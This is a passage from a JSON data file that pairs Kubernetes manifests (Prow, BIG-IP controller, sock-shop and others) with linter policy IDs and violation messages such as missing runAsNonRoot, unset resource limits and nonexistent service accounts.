    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: ti-community-lgtm\n  labels:\n    app: ti-community-lgtm\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ti-community-lgtm\n  template:\n    metadata:\n      labels:\n        app: ti-community-lgtm\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: ti-community-lgtm\n        image: ticommunityinfra/tichi-lgtm-plugin:v1.9.0\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        ports:\n        - name: http\n          containerPort: 80\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: external-plugins-config\n          mountPath: /etc/external_plugins_config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: external-plugins-config\n        configMap:\n          name: external-plugins-config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"hook\" not found"
  },
  {
    "id": "10810",
    "manifest_path": "data/manifests/the_stack_sample/sample_4157.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: ti-community-lgtm\n  labels:\n    app: ti-community-lgtm\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ti-community-lgtm\n  template:\n    metadata:\n      labels:\n        app: ti-community-lgtm\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: ti-community-lgtm\n        image: ticommunityinfra/tichi-lgtm-plugin:v1.9.0\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        ports:\n        - name: http\n          containerPort: 80\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: external-plugins-config\n          mountPath: /etc/external_plugins_config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: external-plugins-config\n        configMap:\n          name: external-plugins-config\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"ti-community-lgtm\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "10811",
    "manifest_path": "data/manifests/the_stack_sample/sample_4157.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: ti-community-lgtm\n  labels:\n    app: ti-community-lgtm\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ti-community-lgtm\n  template:\n    metadata:\n      labels:\n        app: ti-community-lgtm\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: ti-community-lgtm\n        image: ticommunityinfra/tichi-lgtm-plugin:v1.9.0\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        ports:\n        - name: http\n          containerPort: 80\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: external-plugins-config\n          mountPath: /etc/external_plugins_config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: external-plugins-config\n        configMap:\n          name: external-plugins-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ti-community-lgtm\" is not set to runAsNonRoot"
  },
  {
    "id": "10812",
    "manifest_path": "data/manifests/the_stack_sample/sample_4157.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: ti-community-lgtm\n  labels:\n    app: ti-community-lgtm\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ti-community-lgtm\n  template:\n    metadata:\n      labels:\n        app: ti-community-lgtm\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: ti-community-lgtm\n        image: ticommunityinfra/tichi-lgtm-plugin:v1.9.0\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        ports:\n        - name: http\n          containerPort: 80\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: external-plugins-config\n          mountPath: /etc/external_plugins_config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: external-plugins-config\n        configMap:\n          name: external-plugins-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ti-community-lgtm\" has cpu request 0"
  },
  {
    "id": "10813",
    "manifest_path": "data/manifests/the_stack_sample/sample_4157.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: ti-community-lgtm\n  labels:\n    app: ti-community-lgtm\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ti-community-lgtm\n  template:\n    metadata:\n      labels:\n        app: ti-community-lgtm\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: ti-community-lgtm\n        image: ticommunityinfra/tichi-lgtm-plugin:v1.9.0\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        ports:\n        - name: http\n          containerPort: 80\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: external-plugins-config\n          mountPath: /etc/external_plugins_config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: external-plugins-config\n        configMap:\n          name: external-plugins-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ti-community-lgtm\" has memory limit 0"
  },
  {
    "id": "10814",
    "manifest_path": "data/manifests/the_stack_sample/sample_4158.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: k8s-bigip-ctlr\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: k8s-bigip-ctlr\n  template:\n    metadata:\n      name: k8s-bigip-ctlr\n      labels:\n        app: k8s-bigip-ctlr\n    spec:\n      serviceAccountName: k8s-bigip-ctlr\n      containers:\n      - name: k8s-bigip-ctlr\n        image: f5networks/k8s-bigip-ctlr:2.2.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: BIGIP_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: bigip-login\n              key: username\n        - name: BIGIP_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: bigip-login\n              key: password\n        command:\n        - /app/bin/k8s-bigip-ctlr\n        args:\n        - --bigip-username=$(BIGIP_USERNAME)\n        - --bigip-password=$(BIGIP_PASSWORD)\n        - --bigip-url=https://10.1.1.4:8443\n        - --insecure=true\n        - --bigip-partition=kubernetes\n        - --pool-member-type=nodeport\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"k8s-bigip-ctlr\" does not have a read-only root file system"
  },
  {
    "id": "10815",
    "manifest_path": "data/manifests/the_stack_sample/sample_4158.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: k8s-bigip-ctlr\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: k8s-bigip-ctlr\n  template:\n    metadata:\n      name: k8s-bigip-ctlr\n      labels:\n        app: k8s-bigip-ctlr\n    spec:\n      serviceAccountName: k8s-bigip-ctlr\n      containers:\n      - name: k8s-bigip-ctlr\n        image: f5networks/k8s-bigip-ctlr:2.2.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: BIGIP_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: bigip-login\n              key: username\n        - name: BIGIP_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: bigip-login\n              key: password\n        command:\n        - /app/bin/k8s-bigip-ctlr\n        args:\n        - --bigip-username=$(BIGIP_USERNAME)\n        - --bigip-password=$(BIGIP_PASSWORD)\n        - --bigip-url=https://10.1.1.4:8443\n        - --insecure=true\n        - --bigip-partition=kubernetes\n        - --pool-member-type=nodeport\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"k8s-bigip-ctlr\" not found"
  },
  {
    "id": "10816",
    "manifest_path": "data/manifests/the_stack_sample/sample_4158.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: k8s-bigip-ctlr\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: k8s-bigip-ctlr\n  template:\n    metadata:\n      name: k8s-bigip-ctlr\n      labels:\n        app: k8s-bigip-ctlr\n    spec:\n      serviceAccountName: k8s-bigip-ctlr\n      containers:\n      - name: k8s-bigip-ctlr\n        image: f5networks/k8s-bigip-ctlr:2.2.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: BIGIP_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: bigip-login\n              key: username\n        - name: BIGIP_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: bigip-login\n              key: password\n        command:\n        - /app/bin/k8s-bigip-ctlr\n        args:\n        - --bigip-username=$(BIGIP_USERNAME)\n        - --bigip-password=$(BIGIP_PASSWORD)\n        - --bigip-url=https://10.1.1.4:8443\n        - --insecure=true\n        - --bigip-partition=kubernetes\n        - --pool-member-type=nodeport\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"k8s-bigip-ctlr\" is not set to runAsNonRoot"
  },
  {
    "id": "10817",
    "manifest_path": "data/manifests/the_stack_sample/sample_4158.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: k8s-bigip-ctlr\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: k8s-bigip-ctlr\n  template:\n    metadata:\n      name: k8s-bigip-ctlr\n      labels:\n        app: k8s-bigip-ctlr\n    spec:\n      serviceAccountName: k8s-bigip-ctlr\n      containers:\n      - name: k8s-bigip-ctlr\n        image: f5networks/k8s-bigip-ctlr:2.2.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: BIGIP_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: bigip-login\n              key: username\n        - name: BIGIP_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: bigip-login\n              key: password\n        command:\n        - /app/bin/k8s-bigip-ctlr\n        args:\n        - --bigip-username=$(BIGIP_USERNAME)\n        - --bigip-password=$(BIGIP_PASSWORD)\n        - --bigip-url=https://10.1.1.4:8443\n        - --insecure=true\n        - --bigip-partition=kubernetes\n        - --pool-member-type=nodeport\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"k8s-bigip-ctlr\" has cpu request 0"
  },
  {
    "id": "10818",
    "manifest_path": "data/manifests/the_stack_sample/sample_4158.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: k8s-bigip-ctlr\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: k8s-bigip-ctlr\n  template:\n    metadata:\n      name: k8s-bigip-ctlr\n      labels:\n        app: k8s-bigip-ctlr\n    spec:\n      serviceAccountName: k8s-bigip-ctlr\n      containers:\n      - name: k8s-bigip-ctlr\n        image: f5networks/k8s-bigip-ctlr:2.2.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: BIGIP_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: bigip-login\n              key: username\n        - name: BIGIP_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: bigip-login\n              key: password\n        command:\n        - /app/bin/k8s-bigip-ctlr\n        args:\n        - --bigip-username=$(BIGIP_USERNAME)\n        - --bigip-password=$(BIGIP_PASSWORD)\n        - --bigip-url=https://10.1.1.4:8443\n        - --insecure=true\n        - --bigip-partition=kubernetes\n        - --pool-member-type=nodeport\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"k8s-bigip-ctlr\" has memory limit 0"
  },
  {
    "id": "10819",
    "manifest_path": "data/manifests/the_stack_sample/sample_4160.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tide\n  labels:\n    app.kubernetes.io/part-of: prow\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20210728-b79cedd058\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --gcs-credentials-file=/etc/service-account/service-account.json\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --history-uri=gs://istio-prow/tide-history.json\n        - --job-config-path=/etc/job-config\n        - --status-path=gs://istio-prow/tide-status-checkpoint.yaml\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: service-account\n          mountPath: /etc/service-account\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: service-account\n        secret:\n          secretName: prow-service-account\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"tide\" does not have a read-only root file system"
  },
  {
    "id": "10820",
    "manifest_path": "data/manifests/the_stack_sample/sample_4160.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tide\n  labels:\n    app.kubernetes.io/part-of: prow\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20210728-b79cedd058\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --gcs-credentials-file=/etc/service-account/service-account.json\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --history-uri=gs://istio-prow/tide-history.json\n        - --job-config-path=/etc/job-config\n        - --status-path=gs://istio-prow/tide-status-checkpoint.yaml\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: service-account\n          mountPath: /etc/service-account\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: service-account\n        secret:\n          secretName: prow-service-account\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"tide\" not found"
  },
  {
    "id": "10821",
    "manifest_path": "data/manifests/the_stack_sample/sample_4160.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tide\n  labels:\n    app.kubernetes.io/part-of: prow\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20210728-b79cedd058\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --gcs-credentials-file=/etc/service-account/service-account.json\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --history-uri=gs://istio-prow/tide-history.json\n        - --job-config-path=/etc/job-config\n        - --status-path=gs://istio-prow/tide-status-checkpoint.yaml\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: service-account\n          mountPath: /etc/service-account\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: service-account\n        secret:\n          secretName: prow-service-account\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"tide\" is not set to runAsNonRoot"
  },
  {
    "id": "10822",
    "manifest_path": "data/manifests/the_stack_sample/sample_4160.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tide\n  labels:\n    app.kubernetes.io/part-of: prow\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20210728-b79cedd058\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --gcs-credentials-file=/etc/service-account/service-account.json\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --history-uri=gs://istio-prow/tide-history.json\n        - --job-config-path=/etc/job-config\n        - --status-path=gs://istio-prow/tide-status-checkpoint.yaml\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: service-account\n          mountPath: /etc/service-account\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: service-account\n        secret:\n          secretName: prow-service-account\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"tide\" has cpu request 0"
  },
  {
    "id": "10823",
    "manifest_path": "data/manifests/the_stack_sample/sample_4160.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tide\n  labels:\n    app.kubernetes.io/part-of: prow\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20210728-b79cedd058\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --gcs-credentials-file=/etc/service-account/service-account.json\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --history-uri=gs://istio-prow/tide-history.json\n        - --job-config-path=/etc/job-config\n        - --status-path=gs://istio-prow/tide-status-checkpoint.yaml\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: service-account\n          mountPath: /etc/service-account\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: service-account\n        secret:\n          secretName: prow-service-account\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"tide\" has memory limit 0"
  },
  {
    "id": "10824",
    "manifest_path": "data/manifests/the_stack_sample/sample_4162.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cyborg-seeker-finals-cromu00065-pov0\n  labels:\n    type: cyborg-seeker\nspec:\n  volumes:\n  - name: cyborg-results\n    persistentVolumeClaim:\n      claimName: cyborg-results\n  containers:\n  - name: cyborg-seeker-finals-cromu00065-pov0\n    image: zardus/research:cyborg-generator\n    command:\n    - /bin/bash\n    - -c\n    - python /home/angr/cyborg-generator/kubernetes_seeker.py finals CROMU_00065 pov_0\n      3600\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: cyborg-results\n      mountPath: /results\n    resources:\n      limits:\n        cpu: 1\n        memory: 10Gi\n      requests:\n        cpu: 1\n        memory: 10Gi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cyborg-seeker-finals-cromu00065-pov0\" does not have a read-only root file system"
  },
  {
    "id": "10825",
    "manifest_path": "data/manifests/the_stack_sample/sample_4162.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cyborg-seeker-finals-cromu00065-pov0\n  labels:\n    type: cyborg-seeker\nspec:\n  volumes:\n  - name: cyborg-results\n    persistentVolumeClaim:\n      claimName: cyborg-results\n  containers:\n  - name: cyborg-seeker-finals-cromu00065-pov0\n    image: zardus/research:cyborg-generator\n    command:\n    - /bin/bash\n    - -c\n    - python /home/angr/cyborg-generator/kubernetes_seeker.py finals CROMU_00065 pov_0\n      3600\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: cyborg-results\n      mountPath: /results\n    resources:\n      limits:\n        cpu: 1\n        memory: 10Gi\n      requests:\n        cpu: 1\n        memory: 10Gi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cyborg-seeker-finals-cromu00065-pov0\" is not set to runAsNonRoot"
  },
  {
    "id": "10826",
    "manifest_path": "data/manifests/the_stack_sample/sample_4163.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: front-end-v2\n  namespace: sock-shop\n  labels:\n    app: front-end\n    version: v2\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: front-end\n      version: v2\n  template:\n    metadata:\n      labels:\n        app: front-end\n        version: v2\n    spec:\n      containers:\n      - name: front-end\n        image: siteshm/front-end:canary\n        imagePullPolicy: Always\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        ports:\n        - containerPort: 8079\n        env:\n        - name: SESSION_REDIS\n          value: 'true'\n        securityContext:\n          runAsNonRoot: true\n          runAsUser: 10001\n          capabilities:\n            drop:\n            - all\n          readOnlyRootFilesystem: true\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8079\n          initialDelaySeconds: 300\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8079\n          initialDelaySeconds: 30\n          periodSeconds: 3\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "10827",
    "manifest_path": "data/manifests/the_stack_sample/sample_4163.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: front-end-v2\n  namespace: sock-shop\n  labels:\n    app: front-end\n    version: v2\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: front-end\n      version: v2\n  template:\n    metadata:\n      labels:\n        app: front-end\n        version: v2\n    spec:\n      containers:\n      - name: front-end\n        image: siteshm/front-end:canary\n        imagePullPolicy: Always\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        ports:\n        - containerPort: 8079\n        env:\n        - name: SESSION_REDIS\n          value: 'true'\n        securityContext:\n          runAsNonRoot: true\n          runAsUser: 10001\n          capabilities:\n            drop:\n            - all\n          readOnlyRootFilesystem: true\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8079\n          initialDelaySeconds: 300\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8079\n          initialDelaySeconds: 30\n          periodSeconds: 3\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"front-end\" has memory limit 0"
  },
  {
    "id": "10828",
    "manifest_path": "data/manifests/the_stack_sample/sample_4165.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tdedahaks-1602\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: tdedahaks-1602\n  template:\n    metadata:\n      labels:\n        app: tdedahaks-1602\n    spec:\n      containers:\n      - name: tdedahaks-1602\n        image: deepak2121.azurecr.io/tdedahaks1602\n        ports:\n        - containerPort: 4000\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"tdedahaks-1602\" is using an invalid container image, \"deepak2121.azurecr.io/tdedahaks1602\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10829",
    "manifest_path": "data/manifests/the_stack_sample/sample_4165.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tdedahaks-1602\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: tdedahaks-1602\n  template:\n    metadata:\n      labels:\n        app: tdedahaks-1602\n    spec:\n      containers:\n      - name: tdedahaks-1602\n        image: deepak2121.azurecr.io/tdedahaks1602\n        ports:\n        - containerPort: 4000\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "10830",
    "manifest_path": "data/manifests/the_stack_sample/sample_4165.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tdedahaks-1602\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: tdedahaks-1602\n  template:\n    metadata:\n      labels:\n        app: tdedahaks-1602\n    spec:\n      containers:\n      - name: tdedahaks-1602\n        image: deepak2121.azurecr.io/tdedahaks1602\n        ports:\n        - containerPort: 4000\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"tdedahaks-1602\" does not have a read-only root file system"
  },
  {
    "id": "10831",
    "manifest_path": "data/manifests/the_stack_sample/sample_4165.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tdedahaks-1602\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: tdedahaks-1602\n  template:\n    metadata:\n      labels:\n        app: tdedahaks-1602\n    spec:\n      containers:\n      - name: tdedahaks-1602\n        image: deepak2121.azurecr.io/tdedahaks1602\n        ports:\n        - containerPort: 4000\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"tdedahaks-1602\" is not set to runAsNonRoot"
  },
  {
    "id": "10832",
    "manifest_path": "data/manifests/the_stack_sample/sample_4165.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tdedahaks-1602\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: tdedahaks-1602\n  template:\n    metadata:\n      labels:\n        app: tdedahaks-1602\n    spec:\n      containers:\n      - name: tdedahaks-1602\n        image: deepak2121.azurecr.io/tdedahaks1602\n        ports:\n        - containerPort: 4000\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"tdedahaks-1602\" has cpu request 0"
  },
  {
    "id": "10833",
    "manifest_path": "data/manifests/the_stack_sample/sample_4165.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tdedahaks-1602\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: tdedahaks-1602\n  template:\n    metadata:\n      labels:\n        app: tdedahaks-1602\n    spec:\n      containers:\n      - name: tdedahaks-1602\n        image: deepak2121.azurecr.io/tdedahaks1602\n        ports:\n        - containerPort: 4000\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"tdedahaks-1602\" has memory limit 0"
  },
  {
    "id": "10834",
    "manifest_path": "data/manifests/the_stack_sample/sample_4166.yaml",
